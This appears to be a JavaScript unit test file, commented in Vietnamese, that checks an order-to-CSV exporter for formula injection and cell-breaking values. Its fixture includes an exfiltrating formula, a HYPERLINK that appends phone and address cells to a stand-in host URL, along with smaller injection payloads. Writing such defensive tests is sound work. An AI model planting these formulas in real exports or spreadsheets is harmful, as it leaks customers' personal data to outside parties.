// INJ-04: ô CSV bắt đầu bằng = + - @ tab CR bị Excel/Sheets tính như công thức.
import test from 'node:test';
import assert from 'node:assert/strict';
import { exportOrdersToCSV } from '../public/js/export.js';

// Tách CSV theo đúng chuẩn (ngoặc kép, "" là một dấu ").
function parseCsv(text) {
  const rows = [];
  let row = [], cell = '', quoted = false;
  for (let i = 0; i < text.length; i++) {
    const ch = text[i];
    if (quoted) {
      if (ch === '"' && text[i + 1] === '"') { cell += '"'; i++; }
      else if (ch === '"') quoted = false;
      else cell += ch;
    } else if (ch === '"') quoted = true;
    else if (ch === ',') { row.push(cell); cell = ''; }
    else if (ch === '\r' && text[i + 1] === '\n') { row.push(cell); rows.push(row); row = []; cell = ''; i++; }
    else cell += ch;
  }
  row.push(cell); rows.push(row);
  return rows;
}

const FORMULA_START = /^[=+\-@\t\r]/;

test('xuất CSV: tên, username, SĐT, địa chỉ, ghi chú độc không thành công thức và không phá ô', () => {
  const evil = '=HYPERLINK("https://ev.il/?d="&F2&G2,"Xem chi tiết")';
  const { csvContent } = exportOrdersToCSV([{
    code: '+SUM(1)',
    ts: Date.UTC(2026, 10, 15),
    nickname: evil,
    uniqueId: 'SUM(A1)',
    userId: '123',
    phone: '0912","=1+1',
    address: '-2+3',
    note: '\t=cmd',
    items: [{ name: '@x', qty: 1, price: 150000 }],
    subtotal: 150000,
    total: 150000,
    status: 'new',
  }]);
  const rows = parseCsv(csvContent.replace(/^﻿/, ''));
  assert.equal(rows.length, 2);
  assert.equal(rows[1].length, rows[0].length, 'không được tách thêm cột');
  for (const cell of rows[1]) assert.doesNotMatch(cell, FORMULA_START, `ô "${cell}" vẫn bắt đầu bằng ký tự công thức`);
  // Nội dung vẫn còn nguyên sau dấu nháy.
  assert.equal(rows[1][2], `'${evil}`);
  assert.equal(rows[1][6], "'-2+3");
  assert.match(rows[1][5], /0912","=1\+1$/);
});

test('xuất CSV: dữ liệu bình thường giữ nguyên', () => {
  const { csvContent } = exportOrdersToCSV([{
    code: 'DH001', ts: Date.UTC(2026, 10, 15), nickname: 'Lan Anh', uniqueId: 'lananh',
    userId: '999', phone: '0912345678', address: '12 Lê Lợi, Q1', note: '',
    items: [{ name: 'Áo', qty: 2, price: 100000 }], subtotal: 200000, total: 200000, status: 'new',
  }]);
  const row = parseCsv(csvContent.replace(/^﻿/, ''))[1];
  assert.equal(row[0], 'DH001');
  assert.equal(row[2], 'Lan Anh');
  assert.equal(row[6], '12 Lê Lợi, Q1');
  assert.equal(row[12], '200000');
});

test('csvCell (dùng cho cả xuất lịch sử bình luận): vô hiệu = + - @ tab CR, giữ số và chữ thường', async () => {
  const { csvCell } = await import('../public/js/export.js');
  assert.equal(csvCell('=1+1'), `"'=1+1"`);
  assert.equal(csvCell('@SUM(A1)'), `"'@SUM(A1)"`);
  assert.equal(csvCell('\r=x'), `"'\r=x"`);
  assert.equal(csvCell('a"b'), '"a""b"');
  assert.equal(csvCell(150000), '"150000"');
  assert.equal(csvCell(null), '""');
});
